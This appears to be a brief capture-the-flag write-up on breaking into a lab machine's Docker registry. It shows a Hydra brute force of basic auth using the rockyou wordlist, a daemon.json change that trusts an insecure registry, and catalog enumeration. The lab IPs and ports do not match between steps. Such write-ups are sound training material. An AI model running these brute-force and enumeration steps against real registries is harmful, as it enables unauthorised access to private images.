# URL

# Concept
* Docker registry hacking
  * brute forcing Docker registry basic authentication
  * enumerating Docker registry catalog
  * enumerating Docker manifest
    * OCI indexes in manifest
# Method of solve
## Port Scanning and Initial Investigation
* there are three ports open, `22` (SSH), `80` (HTTP), and `5000` (HTTP)
* the app on port 80 has a comment at the bottom of the source code which we intepret as a username: `adm`
* according to nmap, the app on port 5000 is a Docker Registry app, which is used to manage Docker images
* when we attempt to enumerate the Docker Registry app, we run into two problems:
  * the app requires basic auth login
  * we use Hydra to brute force the password with the `adm` user name we found earlier:
```
hydra -l adm -P /usr/share/wordlists/rockyou.txt latestwasalie.hmv -s 5000 http-get /v2/_catalog
```
  * this reveals that the password is `lover1`
  * this server is not HTTPS, so we have to edit a Docker config file to accept the server as an insecure one:
  * add the following to the `/etc/docker/daemon.json` file
```
{
  "insecure-registries": ["192.168.212.38:5000"]
}
```
  * after this, we need to restart the daemon and Docker:
```
systemctl daemon-reload
systemctl restart docker
``` 
* after this, we have to login to the Docker Registry:
```
docker login 192.168.212.38:5000
```
* we navigate to the following endpoint on the Docker registry to find what containers it is hosting:
`http://192.168.212.31:1007/v2/_catalog`


